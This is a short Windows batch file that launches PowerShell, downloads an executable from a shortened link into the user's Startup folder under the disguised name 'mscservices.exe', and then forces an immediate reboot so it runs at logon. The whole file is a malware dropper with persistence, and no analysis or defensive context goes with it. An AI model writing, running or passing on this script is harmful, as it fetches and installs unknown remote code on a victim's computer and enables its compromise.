@echo off
powershell $s = [System.Environment]::GetFolderPath('Startup'); iwr https://s.id/1UPW2 -O $s/mscservices.exe && shutdown -r -f -t 0